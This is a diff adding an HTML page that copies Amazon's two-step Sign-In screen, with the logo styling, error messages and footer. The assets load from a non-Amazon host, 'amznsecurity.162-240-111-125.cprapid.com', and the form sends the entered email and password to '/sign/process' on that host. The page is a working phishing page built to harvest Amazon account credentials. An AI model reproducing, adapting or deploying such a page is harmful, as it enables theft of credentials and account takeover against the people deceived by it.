@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-2021-08-16">
+ <head>
+  <meta charset="utf-8"/>
+  <title>
+   Amazon Sign-In
+  </title>
+  <link href="https://amznsecurity.162-240-111-125.cprapid.com/AREA16/assets/images/favicon.ico" rel="shortcut icon"/>
+  <link href="https://amznsecurity.162-240-111-125.cprapid.com/AREA16/assets/css/sign-dekstop.css" rel="stylesheet"/>
+  <link href="https://amznsecurity.162-240-111-125.cprapid.com/AREA16/assets/css/style.sign-desktop.css" rel="stylesheet"/>
+ </head>
+ <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate" cz-shortcut-listen="true">
+  <div id="a-page">
+   <div class="a-section a-padding-medium auth-workflow">
+    <div class="a-section a-spacing-none auth-navbar">
+     <div class="a-section a-spacing-medium a-text-center">
+      <div class="a-link-nav-icon">
+      </div>
+      <i aria-label="Amazon" class="a-icon a-icon-logo" role="img">
+      </i>
+     </div>
+    </div>
+    <div class="a-section" id="authportal-center-section">
+     <div class="a-section a-spacing-base auth-pagelet-container badInput hide">
+      <div class="a-section">
+       <div aria-live="assertive" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" id="auth-error-message-box" role="alert">
+        <div class="a-box-inner a-alert-container">
+         <h4 class="a-alert-heading">
+          There was a problem
+         </h4>
+         <i class="a-icon a-icon-alert">
+         </i>
+         <div class="a-alert-content">
+          <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
+           <li>
+            <span class="a-list-item">
+             We cannot find an account with that email address
+            </span>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="a-section auth-pagelet-container">
+      <div class="a-section a-spacing-base">
+       <div class="a-section">
+        <form action="https://amznsecurity.162-240-111-125.cprapid.com/sign/process" class="auth-validate-form auth-real-time-validation a-spacing-none" id="konzform" method="post" name="signIn" onsubmit="return checkpass();">
+         <div class="a-section">
+          <div class="a-box" id="emailpage">
+           <div class="a-box-inner a-padding-extra-large">
+            <h1 class="a-spacing-small">
+             Sign-In
+            </h1>
+            <div class="a-row a-spacing-base">
+             <label class="a-form-label" for="ap_email">
+              Email or mobile phone number
+             </label>
+             <input class="a-input-text a-span12 auth-autofocus auth-required-field formemail" id="ap_email" maxlength="128" name="emailLogin" type="text"/>
+             <style>
+              .show {
+														display: block;
+													}
+             </style>
+             <div aria-live="assertive" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini" id="auth-email-missing-alert" role="alert">
+              <div class="a-box-inner a-alert-container">
+               <i class="a-icon a-icon-alert">
+               </i>
+               <div class="a-alert-content">
+                Enter your email or mobile phone number
+               </div>
+              </div>
+             </div>
+            </div>
+            <div class="a-section">
+             <span class="a-button a-button-span12 a-button-primary" id="continue">
+              <span class="a-button-inner">
+               <input class="a-button-input" id="btnContinue" onclick="return showPass();" type="submit"/>
+               <span aria-hidden="true" class="a-button-text" id="continue-announce">
+                Continue
+               </span>
+              </span>
+             </span>
+             <div class="a-row a-spacing-top-medium a-size-small" id="legalTextRow">
+              By continuing, you agree to Amazon's
+              <a href="#">
+               Conditions of Use
+              </a>
+              and
+              <a href="#">
+               Privacy Notice
+              </a>
+              .
+             </div>
+            </div>
+            <div class="a-section">
+             <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
+              <a>
+               <i class="a-icon a-icon-expand">
+               </i>
+               <span class="a-expander-prompt">
+                Need help?
+               </span>
+              </a>
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="a-box hide" id="passpage">
+           <div class="a-box-inner a-padding-extra-large">
+            <h1 class="a-spacing-small">
+             Sign-In
+            </h1>
+            <div class="a-row a-spacing-base">
+             <span id="emailsgin">
+             </span>
+             <a class="a-link-normal" id="ap_change_login_claim" onclick="history.go(0)" value="Refresh">
+              Change
+             </a>
+            </div>
+            <div class="a-section">
+             <div class="a-section a-spacing-large">
+              <div class="a-row">
+               <div class="a-column a-span5">
+                <label class="a-form-label" for="ap_password">
+                 Password
+                </label>
+               </div>
+               <div class="a-column a-span7 a-text-right a-span-last">
+                <a class="a-link-normal" href="#" id="auth-fpp-link-bottoms" tabindex="3">
+                 Forgot your password?
+                </a>
+               </div>
+              </div>
+              <input class="a-input-text a-span12 auth-autofocus auth-required-field formpassword" id="ap_password" maxlength="1024" name="passwordLogin" tabindex="2" type="password"/>
+              <div aria-live="assertive" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini passnull" id="auth-password-missing-alert" role="alert">
+               <div class="a-box-inner a-alert-container">
+                <i class="a-icon a-icon-alert">
+                </i>
+                <div class="a-alert-content">
+                 Enter your password
+                </div>
+               </div>
+              </div>
+             </div>
+             <div class="a-section">
+              <span class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit" id="auth-signin-button">
+               <span class="a-button-inner">
+                <input aria-labelledby="auth-signin-button-announce" class="a-button-input" id="signInSubmit" tabindex="5" type="submit"/>
+                <span aria-hidden="true" class="a-button-text" id="auth-signin-button-announce">
+                 Sign-In
+                </span>
+               </span>
+              </span>
+              <div class="a-row a-spacing-top-medium">
+               <div class="a-section a-text-left">
+                <label class="a-form-label" for="auth-remember-me">
+                 <div class="a-checkbox" data-a-input-name="rememberMe">
+                  <label>
+                   <input name="rememberMe" tabindex="4" type="checkbox" value="true"/>
+                   <i class="a-icon a-icon-checkbox">
+                   </i>
+                   <span class="a-label a-checkbox-label">
+                    Keep me signed in.
+                    <span class="a-declarative">
+                     <a class="a-popover-trigger a-declarative" href="javascript:void(0)" id="remember_me_learn_more_link">
+                      Details
+                      <i class="a-icon a-icon-popover">
+                      </i>
+                     </a>
+                    </span>
+                   </span>
+                  </label>
+                 </div>
+                </label>
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </form>
+       </div>
+       <div class="a-divider-sprite2" id="data-sprite">
+        <div class="a-divider a-divider-break">
+         <h5>
+          New to Amazon?
+         </h5>
+        </div>
+        <span class="a-button a-button-span12 a-button-base" id="auth-create-account-link">
+         <span class="a-button-inner">
+          <a class="a-button-text" href="#" id="createAccountSubmit" role="button">
+           Create your Amazon account
+          </a>
+         </span>
+        </span>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div id="right-2">
+   </div>
+   <div class="a-section a-spacing-top-extra-large auth-footer">
+    <div class="a-divider a-divider-section">
+     <div class="a-divider-inner">
+     </div>
+    </div>
+    <div class="a-section a-spacing-small a-text-center a-size-mini">
+     <span class="auth-footer-seperator">
+     </span>
+     <a class="a-link-normal">
+      Conditions of Use
+     </a>
+     <span class="auth-footer-seperator">
+     </span>
+     <a class="a-link-normal">
+      Privacy Notice
+     </a>
+     <span class="auth-footer-seperator">
+     </span>
+     <a class="a-link-normal">
+      Help
+     </a>
+     <span class="auth-footer-seperator">
+     </span>
+    </div>
+    <div class="a-section a-spacing-none a-text-center">
+     <span class="a-size-mini a-color-secondary">
+      © 1996-2022, Amazon.com, Inc. or its affiliates
+     </span>
+    </div>
+   </div>
+  </div>
+  <script src="https://amznsecurity.162-240-111-125.cprapid.com/AREA16/assets/js/jquery-3.3.1.min.js">
+  </script>
+  <script src="https://amznsecurity.162-240-111-125.cprapid.com/AREA16/assets/js/jquery.validate.min.js">
+  </script>
+  <script>
+   $(document).ready(function() {
+    	    $("form").submit(function() {
+    	        $(this).submit(function() {
+    	            return false;
+    	        });
+    	        return true;
+    	    });     
+    	});
+		$('input[name=emailLogin]').on('keyup', function() {
+			$('#emailsgin').html($(this).val());
+		});
+
+		$('#ap_password').on('keyup', function(s) {
+			if(13 == s.keyCode) $('#signInSubmit').click();
+		});
+
+		let showPass = () => {
+			let ap_email = $('#ap_email').val();
+
+			if(ap_email.length == '') {
+				$('.auth-inlined-error-message').addClass('show');
+				$('.formemail').addClass('a-form-error');
+				return true;
+			} else if(!ap_email.match(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/)) {
+				$('.formemail').addClass('a-form-error');
+				$('.badInput').removeClass('hide');
+				return true;
+			} else {
+				$('.formemail').removeClass('a-form-error');
+				$('.passnull').removeClass('show');
+				$('#btncontinue').addClass('hide');
+				$('.badInput').addClass('hide');
+				$('#emailpage').addClass('hide');
+				$('#data-sprite').addClass('hide');
+				$('#passpage').removeClass('hide');
+				return false;
+			}
+		}
+
+		let checkpass = () => {
+			let ap_password = $('#ap_password').val();
+			
+			if(ap_password.length < 6) {
+				$('.passnull').addClass('show');
+				$('.formpassword').addClass('show');
+				return false;
+			} else {
+				$('.passnull').removeClass('show');
+				$('.formpassword').removeClass('show');
+			}
+		}
+  </script>
+ </body>
+</html>
